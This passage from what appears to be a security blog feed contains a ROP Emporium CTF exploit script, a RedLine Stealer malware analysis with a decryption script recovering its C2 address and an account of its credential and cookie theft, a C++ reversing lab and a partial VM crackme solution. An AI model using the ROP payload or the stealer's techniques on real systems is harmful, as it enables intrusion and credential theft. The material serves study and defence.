pop_rdi <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00400693</span><span class="token punctuation">)</span>
mov_r14_r15 <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00400628</span><span class="token punctuation">)</span>
print_file_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400510</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token comment">#fill the buffer</span>
payload <span class="token operator">+=</span> <span class="token string">b"B"</span> <span class="token operator">*</span><span class="token number">8</span>  <span class="token comment">#overwrite the base pointer</span>
payload <span class="token operator">+=</span> pop_r14_r15
payload <span class="token operator">+=</span> bss_area
payload <span class="token operator">+=</span> <span class="token string">b"flag.txt"</span>
payload <span class="token operator">+=</span> mov_r14_r15
payload <span class="token operator">+=</span> pop_rdi
payload <span class="token operator">+=</span> bss_area
payload <span class="token operator">+=</span> print_file_addr

io<span class="token punctuation">.</span>writeafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

pwn<span class="token punctuation">.</span>info<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Successful execution of our exploit, will display a success flag.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:write4$ python3 x.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'./write4'</span><span class="token builtin class-name">:</span> pid <span class="token number">7275</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>45B<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'./write4'</span> stopped with <span class="token builtin class-name">exit</span> code -11 <span class="token punctuation">(</span>SIGSEGV<span class="token punctuation">)</span> <span class="token punctuation">(</span>pid <span class="token number">7275</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Thank you<span class="token operator">!</span>
    ROPE<span class="token punctuation">&#123;</span>a_placeholder_32byte_flag<span class="token operator">!</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <tags>
        <tag>ropemporium</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>RedLineStealer information stealer analysis</title>
    <url>/2022/02/07/RedLineStealer-Stealer/</url>
    <content><![CDATA[<p>Redline malware is an Information Stealer written in c#, targeting windows victims. It is used for gathering victims information ranging from the Browser cookies, saved credentials, Discord tokens, OS information, <span id="more"></span> Languages, VPN profiles, Installed Programs and Network configurations.</p>
<p>The malware is capable of downloading additional malware from its C2 servers.</p>
<h2 id="Stage1-Loader-Analysis"><a href="#Stage1-Loader-Analysis" class="headerlink" title="Stage1 - Loader Analysis"></a>Stage1 - Loader Analysis</h2><p>The first stage of sample malware is used for assembling and executing an additional payload. The sample used throughout this post is <code>RedlineStealer</code> malware which can be downloaded from <a href="https://bazaar.abuse.ch/">MalwareBaazar</a>.</p>
<p>The sha256 hash of the sample is <code>72b7f772e019def30abcf817ae7a3004a84215daef67588eaa1fde3839df2fa2</code>. First step is loading sample in <code>Detect it Easy</code> tool to check whether is packed or not.</p>
<p><img data-src="/images/redline/redliner.png"></p>
<p>From the initial Analysis, the sample is not packed and is a <code>.NET</code> Family malware. Vast amount of <code>.NET</code> family programming languages functionality has given malware authors power to write simple yet powerful tools therefore leading to an increase in malware distributed.</p>
<h2 id="Payload-Extraction"><a href="#Payload-Extraction" class="headerlink" title="Payload Extraction"></a>Payload Extraction</h2><p>For Analysis of compiled binaries, <code>IDA</code> and <code>ghidra</code> are main first tools of choice to an analyst. For analysis of .NET binaries is different, use <code>dnSpy</code> which helps debug the functionality of the sample.</p>
<p>For extraction of our payload, we will do both manual and dynamic extraction of the second stage binary. Both methods have their own advantages and disadvantages as highlighted below.</p>
<h3 id="Method1-Manual-Extraction"><a href="#Method1-Manual-Extraction" class="headerlink" title="Method1 - Manual Extraction"></a>Method1 - Manual Extraction</h3><p>This method is we extract payload from the encrypted string arrays <code>s</code> as shown in the image below. Malware uses anti-analysis techniques to prevent it from being analyzed.</p>
<p><img data-src="/images/redline/stringarray.png"></p>
<p>From image above, we de-obfuscate malware by replacing the strings with the target strings as shown in the program. After replacing all the strings,we write a small python program to convert the base64 encoded string to PE binary.</p>
<p>The python script to decode the base64 encoded string to binary.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64

<span class="token comment">#s string array is our binary</span>
string_encoded <span class="token operator">=</span> <span class="token string">" "</span>
decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>string_encoded<span class="token punctuation">)</span>
<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'stage2.exe'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Our dumped files are valid binaries, but do not contain all features because the malware is using Reflection method to load additional assembly code. Reflection is a method used to load other assemblies at runtime of the program. This enables the malware to add extra features and validation of the program.</p>
<h3 id="Method2-Dynamic-Extraction"><a href="#Method2-Dynamic-Extraction" class="headerlink" title="Method2 - Dynamic Extraction"></a>Method2 - Dynamic Extraction</h3><p>The second method <code>Dynamic</code> is more powerful compared to the manual method.This enables us to inspect the program behavior at runtime. For extraction of the second stage payload we put a breakpoint on the line <code>22</code> as shown in image below.</p>
<p><img data-src="/images/redline/breakpoint.png"></p>
<p>On <code>dnspy</code> debugger put a breakpoint on line 22, Run the program until the execution hits the breakpoint.</p>
<p><img data-src="/images/redline/righclick_array.png"></p>
<p>By examining the values in image above,we can examine the array we passing to the object method. Looking at the bytes data of the above array, the first two bytes are magic number of PE file <code>4D5A</code> or ascii <code>MZ</code>. From the first two bytes we can make an assumption the buffer is our second stage binary. Right click the buffer memory to save the sample.</p>
<h2 id="Stage2-Payload-Analysis"><a href="#Stage2-Payload-Analysis" class="headerlink" title="Stage2 - Payload Analysis"></a>Stage2 - Payload Analysis</h2><p>This is the second stage analysis of our extracted malware file, The extracted binary is <code>.NET</code> binary. Opening the binary in debugger, entrypoint of the binary looks as shown in the image below. The main function executes the <code>WriteLine</code> function.</p>
<p><img data-src="/images/redline/dumpedfile.png"></p>
<p>FMalware does environment check before communication to configured C2 servers.</p>
<h3 id="Language-Culture-check"><a href="#Language-Culture-check" class="headerlink" title="Language Culture check"></a>Language Culture check</h3><p>The malware checks the language, Timezone, CultureInfo and region country of the Victims Machine. The cultureInfo class provides information about a specific culture, known as <code>locale</code>. The information includes the formatting of the dates, writing system, numbers and calendar used.<br><img data-src="/images/redline/languagecheck.png"></p>
<p>The malware check if victims region country is within the array of the strings shown above and if the does not contain <code>EnglishName</code>.</p>
<h3 id="Network-Communication-Analysis"><a href="#Network-Communication-Analysis" class="headerlink" title="Network Communication Analysis"></a>Network Communication Analysis</h3><p>The second part of our analysis is determining IP address in which the malware is communicating to.The Ip address of the malware seems to be encrypted as shown in the image below. <code>StringDecrypt</code> function takes two arguments, the IP address and Key and decrypts the <code>address</code><br><img data-src="/images/redline/connection.png"></p>
<p>The arguments variables of the malware are shown in the image below. The arguments includes the IP address and Key used for encryption of the data.</p>
<p><img data-src="/images/redline/args_key.png"></p>
<p>With the encrypted <code>IP</code> and <code>key</code> we can decrypt the address used for providing the connection.</p>
<h3 id="IP-address-Decryption"><a href="#IP-address-Decryption" class="headerlink" title="IP address Decryption"></a>IP address Decryption</h3><p>The <code>StringDecrypt</code> is a multistage decryption method which employs both <code>base64</code> encoding and bitwise <code>xor</code> logic for decryption of the data.</p>
<p><img data-src="/images/redline/decrypt_method.png" alt="Decrypt Strings"></p>
<p>From the logic above, reimplement the logic in <code>python</code> and recover the encrypted data.</p>
<p>The python code used for decrypting the code is,</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> pwn
ip_addr <span class="token operator">=</span><span class="token string">b"AiE1CyQDBVA/JR4OPwIKGSoZGkU6NyVa"</span>
key <span class="token operator">=</span><span class="token string">b"Outshines"</span>

ip_addr_decode <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ip_addr<span class="token punctuation">)</span>
result_encoded <span class="token operator">=</span>pwn<span class="token punctuation">.</span>xor<span class="token punctuation">(</span>ip_addr_decode<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
result <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>result_encoded<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Running above code we get C2 server address</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> $ python3 base.py
b<span class="token string">'101.99.93.70:54437'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="Strings-Conciliation-methods"><a href="#Strings-Conciliation-methods" class="headerlink" title="Strings Conciliation methods"></a>Strings Conciliation methods</h3><p>The malware employs strings concilation methods to slow down analysis. It adds some junk strings to the target strings which is replaced during the runtime of the malware with an empty string.</p>
<p><img data-src="/images/redline/stringreplace.png"></p>
<p>Example of string concilation tactic is above function. The junk string added to the string array is <code>MANGO</code> which is replaced with an empty string.<br>The string from the char array is <code>coMANGOokies.sqMANGOlite</code> , replacing the <code>MANGO</code> string with an empty string, we get <code>cookies.sqlite</code> which is a file used for storing cookies by Firefox browser.</p>
<h2 id="Information-Harvesting"><a href="#Information-Harvesting" class="headerlink" title="Information Harvesting"></a>Information Harvesting</h2><p>The Malware harvest a lot of Victims data and sends back to the configured c2 server. The malware is simple but effective in collecting a lot of user information. The information collected by malware includes cookies, user tokens, system configurations, graphic cards, processor count, Network information, application installed, credit wallet information and many more.</p>
<p>Below is explanation of the capabilities of the malware.</p>
<h3 id="Browser"><a href="#Browser" class="headerlink" title="Browser"></a>Browser</h3><p>The malware is capable of stealing the user&#96;s credentials and cookies of from browser session.</p>
<p><img data-src="/images/redline/browsers.png"></p>
<p>The malware is also capable of enumerating chrome and Opera Mini if installed on the Victim&#96;s machine. It also gets the version of the installed browser as shown in the image below.<br><img data-src="/images/redline/chrome_scan.png"></p>
<h3 id="FileZilla"><a href="#FileZilla" class="headerlink" title="FileZilla"></a>FileZilla</h3><p>Filezilla is a professional software that makes transfer of files from one computer to another easier via FTP, SFTP, FTPs protocols and other cloud services such as Amazon S3.<br><img data-src="/images/redline/filezillacredentials.png"><br>The malware scans for the saved credentials used by Victim in transferring files to other machines. The malware collects <code>host, Port, User, Pass</code> of the machines</p>
<h3 id="Programs-Enumeration"><a href="#Programs-Enumeration" class="headerlink" title="Programs Enumeration"></a>Programs Enumeration</h3><p>Malware is also capable of collecting all installed applications on the machine using <code>ListofPrograms</code> function as shown in the below. After enumerating all the installed applications, the malware sends data back to the C2 server.</p>
<p><img data-src="/images/redline/program_exfil.png"></p>
<p>The malware enumerates installed application through use of registry. Querying of registry is an effective way of finding out all installed applications in Windows. The malware gets the program name and version as shown by <code>text</code> and <code>text2</code> strings.</p>
<p><img data-src="/images/redline/programenumeration_registry.png"></p>
<h3 id="VPN-information-Gathering"><a href="#VPN-information-Gathering" class="headerlink" title="VPN information Gathering"></a>VPN information Gathering</h3><p>The malware scans for Victim&#96;s configuration files and profiles of various VPNs installed on the device. The malware scans File configs NordVPN, OpenVpn configs and ProtonVPN profiles.</p>
<p><img data-src="/images/redline/vpns.png"></p>
<h3 id="Exfilitration"><a href="#Exfilitration" class="headerlink" title="Exfilitration"></a>Exfilitration</h3><p>For the exfiltration of the data, the malware creates a folder in <code>APPdata</code> folder called <code>Yandex\YAddon</code>. The data collected is uploaded in chunks to c2 server.</p>
<p><img data-src="/images/redline/exfil_folder.png"></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><a href="https://www.natlawreview.com/article/privacy-tip-315-redline-malware-used-to-steal-saved-credentials">https://www.natlawreview.com/article/privacy-tip-315-redline-malware-used-to-steal-saved-credentials</a></li>
<li><a href="https://www.zdnet.com/article/fortinet-warns-of-cybercriminals-using-omicron-variant-news-to-distribute-redline-stealer">https://www.zdnet.com/article/fortinet-warns-of-cybercriminals-using-omicron-variant-news-to-distribute-redline-stealer</a></li>
<li><a href="https://www.proofpoint.com/us/blog/threat-insight/new-redline-stealer-distributed-using-coronavirus-themed-email-campaign">https://www.proofpoint.com/us/blog/threat-insight/new-redline-stealer-distributed-using-coronavirus-themed-email-campaign</a></li>
</ol>
]]></content>
      <tags>
        <tag>Malware</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>Reversing C++ basic templates</title>
    <url>/2022/07/16/Reverse-C-Templates/</url>
    <content><![CDATA[<blockquote>
<p>In this exercise you will need to reverse engineer a binary, research different functions, and understand if the functions are part of a template or not. <span id="more"></span></p>
</blockquote>
<p><strong>NB: Decompilers are not permitted, please use only static reverse engineering during this lab.</strong></p>
<p>The lab can be downloaded at the following link <a href="https://gitlab.com/opensecuritytraining/re3011_cpp_re_binaries/-/blob/main/CalcNum%C2%A0">CalcNum lab</a></p>
<h2 id="What-is-a-C-template"><a href="#What-is-a-C-template" class="headerlink" title="What is a C++ template?"></a>What is a C++ template?</h2><p>A Template is a c++ entity that accepts different data types but performs the same functionality. The data types are passed as template parameters to template function so that we don’t need to write same code functionality for different data types.</p>
<h2 id="Lab-Analysis"><a href="#Lab-Analysis" class="headerlink" title="Lab Analysis"></a>Lab Analysis</h2><p>For solving the questions, I used an approach of first reading questions and then reverse engineering those functions only. This ensured I only reversed functions important to our analysis.</p>
<h2 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1"></a>Question 1</h2><blockquote>
<p>Which of the the following functions are part of the same template?</p>
</blockquote>
<p>For reverse engineering we will focus on the following functions, <code>0x1229</code>, <code>0x1620</code>, <code>0x1342</code>, <code>0x15fa</code>, and <code>0x1245</code> in order to answer the first and subsequent questions.</p>
<p>The first step to manually reverse functions and understand what each function is doing.<br>For analysis I will be using IDA Pro freeware.</p>
<h3 id="0x1229-Function-Analysis"><a href="#0x1229-Function-Analysis" class="headerlink" title="0x1229 Function Analysis"></a><code>0x1229</code> Function Analysis</h3><p><img data-src="/images/ost2/sub_func1.png" alt="Subtraction"></p>
<p>Looking at the function as shown in image above, it accepts two parameters of type <code>int</code> and does Subtraction (assembly instruction<code>sub</code>) of local variables <code>x</code> and <code>y</code> ant then returns the result. The return value is of type <code>int</code>, therefore we can set type of our function as shown in the image above.</p>
<h3 id="0x1620-Function-Analysis"><a href="#0x1620-Function-Analysis" class="headerlink" title="0x1620 Function Analysis"></a><code>0x1620</code> Function Analysis</h3><p><img data-src="/images/ost2/max_func.png" alt="Max value"></p>
<p>From the analysis of this function, it accepts two parameters of type <code>long</code> and finds the maximum value between the two. The two parameters are compared through use of <code>jge</code> assembly instruction as shown above.</p>
<h3 id="0x1342-Function-Analysis"><a href="#0x1342-Function-Analysis" class="headerlink" title="0x1342 Function Analysis"></a><code>0x1342</code> Function Analysis</h3><p><img data-src="/images/ost2/func3.png" alt="Max value"></p>
<p>The function accepts two parameters of type <code>long</code> and checks if one parameter is equal to <code>zero</code>. If the value is not equal to <code>zero</code>, it does math and bit operations.</p>
<h3 id="0x15fa-Function-Analysis"><a href="#0x15fa-Function-Analysis" class="headerlink" title="0x15fa Function Analysis"></a><code>0x15fa</code> Function Analysis</h3><p><img data-src="/images/ost2/max_value2.png" alt="Max value"></p>
<p>From the analysis of this function, function accepts two parameters of type <code>int</code> and finds the maximum value between the two. The two parameters are compared through use of <code>jge</code> assembly instruction. Therefore the maximum value is returned by the function.</p>
<h3 id="0x1245-Function-Analysis"><a href="#0x1245-Function-Analysis" class="headerlink" title="0x1245 Function Analysis"></a><code>0x1245</code> Function Analysis</h3><p><img data-src="/images/ost2/func4.png" alt="0x1245 analysis"></p>
<p>This function takes four parameters of type <code>int</code> and does further bits operations as shown in the disassembly code.</p>
<p>From the above functions analysis, only two functions qualify as templates. <code>0x1620</code> and <code>0x15fa</code> are templates functions because they perform the same functionality( <code>Finding the Maximum value</code>) and number of parameters passed to each function are the same.</p>
<h2 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2"></a>Question 2</h2><blockquote>
<p>Review the function at address <code>0x12C5</code> and other functions in the binary. Is this function a template function?</p>
</blockquote>
<h3 id="0x12C5-Function-Analysis"><a href="#0x12C5-Function-Analysis" class="headerlink" title="0x12C5 Function Analysis"></a><code>0x12C5</code> Function Analysis</h3><p><img data-src="/images/ost2/func5.png" alt="0x12c5 analysis"></p>
<p>This function does the same functionality as the function <code>0x1245</code>, but the difference is the unequal number of parameters passed to each function.<br>Therefore, it does <code>not</code> qualify as a template function.</p>
<h2 id="Question-3"><a href="#Question-3" class="headerlink" title="Question 3"></a>Question 3</h2><blockquote>
<p>Review the function at address <code>0x15cc</code> and the function at address <code>0x15fa</code>. Are these functions part of the same template function?</p>
</blockquote>
<h3 id="0x15cc-Function-Analysis"><a href="#0x15cc-Function-Analysis" class="headerlink" title="0x15cc Function Analysis"></a><code>0x15cc</code> Function Analysis</h3><p>This function is used for calculating minimum value of the two parameters passed to function.</p>
<p><img data-src="/images/ost2/min_value.png" alt="0x15cc analysis"></p>
<p>The two functions are <code>not</code> of the same template function. This is because one is used for calculating the maximum value and other one for minimum value. The difference between the two is <code>jge</code> and <code>jle</code> conditional assembly instructions as shown in IDA disassembly above.</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li>C++ Templates Basics - <a href="https://m.cplusplus.com/doc/oldtutorial/templates/">https://m.cplusplus.com/doc/oldtutorial/templates/</a></li>
</ol>
]]></content>
      <tags>
        <tag>reverse</tag>
        <tag>opensecurity</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>Reversing simple 8-Bit VM</title>
    <url>/2021/12/07/Reversing-8-bit-vm/</url>
    <content><![CDATA[<p><code>vm1.exe</code> implements a simple 8-bit virtual machine (VM) to try and stop reverse engineers from retrieving the flag. The VM&#96;s RAM contains the encrypted flag and some bytecode to decrypt it. Can you figure out how the VM works and write your own to decrypt the flag?<span id="more"></span> A copy of the VM’s RAM has been provided in ram.bin (this data is identical to the ram content of the malware’s VM before execution and contains both the custom assembly code and encrypted flag).</p>
<p>Main function analysis</p>
<p><img data-src="/images/mal/vmq.png" alt="Main Function"></p>
<p>From the main function, <strong>HeapAlloc</strong> allocates a memory block of size <strong>0x1FB</strong> bytes. The pointer of the allocated memory block is called <code>allocated_memblock</code> as shown in the image.</p>
<p>The program does a <strong>memcpy</strong> of the content stored in the <code>rambin</code> offset to newly allocated memory block.</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>dest<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>src<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>memcpy</code> function copies data from the source address to destination address of size 0x1fb. The destination address of this program is allocate_memblock. The content of the <code>rambin</code> file and content at the rambin offset are the same as examined below.</p>
<p><img data-src="/images/mal/rambin.png" alt="Rambin"><br><img data-src="/images/mal/ida_hex.png" alt="IDA HEX"></p>
<p>Next step is analyzing <strong>sub_4022E0</strong> function. The disassembled function graph looks like the one below.</p>
<p><img data-src="/images/mal/vmflow.png" alt="sub_4022E0 control flow loop"></p>
<p>From the disassembly above, the binary does some byte operations. The first graph block is doing a bitwise <code>AND</code> operation, which is responsible for setting both <code>SF</code> and <code>ZF</code> to zero.First it sets the value of eax register to 1, and then do a test operation. Because the conditional <strong>“jump if zero”</strong> is not true, we continue our execution to the next control block.</p>
<p>For decompilation of our binary we use ghidra.</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FUN_004022e0</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  byte bVar1<span class="token punctuation">;</span>
  uint uVar2<span class="token punctuation">;</span>
  byte bVar3<span class="token punctuation">;</span>
  byte counter<span class="token punctuation">;</span>

  counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* 0 */</span>
    uVar2 <span class="token operator">=</span> <span class="token punctuation">(</span>uint<span class="token punctuation">)</span>counter<span class="token punctuation">;</span>
      <span class="token comment">/* 2 */</span>
    bVar1 <span class="token operator">=</span> counter <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    bVar3 <span class="token operator">=</span> counter <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
    counter <span class="token operator">=</span> counter <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>
    uVar2 <span class="token operator">=</span> <span class="token function">FUN_00402270</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>byte <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>allocated_memblock <span class="token operator">+</span> <span class="token number">0xff</span> <span class="token operator">+</span> uVar2<span class="token punctuation">)</span><span class="token punctuation">,</span>
                         <span class="token punctuation">(</span>uint<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>byte <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>allocated_memblock <span class="token operator">+</span> <span class="token number">0xff</span> <span class="token operator">+</span> <span class="token punctuation">(</span>uint<span class="token punctuation">)</span>bVar1<span class="token punctuation">)</span><span class="token punctuation">,</span>
                         <span class="token punctuation">(</span>uint<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>byte <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>allocated_memblock <span class="token operator">+</span> <span class="token number">0xff</span> <span class="token operator">+</span> <span class="token punctuation">(</span>uint<span class="token punctuation">)</span>bVar3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uVar2 <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> uVar2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The above c-code like is more easier to understand.The assembly equivalent of this operation is as the one shown in the first memory block of the function.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token label function">loc_4022EA:</span>
mov     <span class="token register variable">eax</span>, <span class="token number">1</span>
test    <span class="token register variable">eax</span>, <span class="token register variable">eax</span>
jz      short loc_402367<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>Function <strong>FUN_00402270</strong> is called and three arguments are passed as parameters.The control graph below shows various operation executed by the binary depending on the argument passed to the function.</p>
<p><img data-src="/images/mal/vmflow2.png" alt="control flow loop"></p>
<p>From the above graph, the function does a compare on the arguments passed with either 1, 2 or 3. If the condition is fulfilled, that operation branch is executed as shown in the image above.</p>
<p>Example: <strong><em>if the argument value passed is 1, control flow branch to loc_4022E address as shown in the graph</em></strong></p>
<p>For better understanding of the control flow, we decompile the function using ghidra, because <strong>idafree</strong> does not support x86 decompilation.The “C-like style” of the code looks like the one below.</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">
<span class="token keyword">int</span> <span class="token function">FUN_00402270</span><span class="token punctuation">(</span><span class="token keyword">int</span> value1<span class="token punctuation">,</span><span class="token keyword">int</span> value2<span class="token punctuation">,</span><span class="token keyword">int</span> param_3<span class="token punctuation">)</span>

<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>value1 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>allocated_memblock <span class="token operator">+</span> value2<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>undefined<span class="token punctuation">)</span>param_3<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>value1 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      value1 <span class="token operator">=</span> allocated_memblock <span class="token operator">+</span> value2<span class="token punctuation">;</span>
      DAT_00404240 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>byte <span class="token operator">*</span><span class="token punctuation">)</span>value1<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>value1 <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> value1 <span class="token operator">&amp;</span> <span class="token number">0xffffff00</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      value1 <span class="token operator">=</span> allocated_memblock <span class="token operator">+</span> value2<span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>byte <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>allocated_memblock <span class="token operator">+</span> value2<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>byte <span class="token operator">*</span><span class="token punctuation">)</span>value1 <span class="token operator">^</span> DAT_00404240<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token function">CONCAT31</span><span class="token punctuation">(</span><span class="token punctuation">(</span>int3<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>value1 <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Decompilation of ghidra is not optimal, therefore decompiled code contains some cast which can be fixed by setting correct data types in the functional signatures. Being an easy VM, we implement the logic in python for decryption of contents <strong><em>ram.bin</em></strong> file.</p>
<p>Fully implemented solution code is below.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#implement decryption routine function in python</span>
<span class="token comment">#solution.py</span>
<span class="token keyword">def</span> <span class="token function">fun_00402270</span><span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">,</span> value3<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> dat_420
    <span class="token keyword">if</span> value1 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        membytes<span class="token punctuation">[</span>value2<span class="token punctuation">]</span> <span class="token operator">=</span> value3
    <span class="token keyword">elif</span> value1 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        dat_420 <span class="token operator">=</span> membytes<span class="token punctuation">[</span>value2<span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> value1 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
            membytes<span class="token punctuation">[</span>value2<span class="token punctuation">]</span> <span class="token operator">=</span> membytes<span class="token punctuation">[</span>value2<span class="token punctuation">]</span> <span class="token operator">^</span> dat_420
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
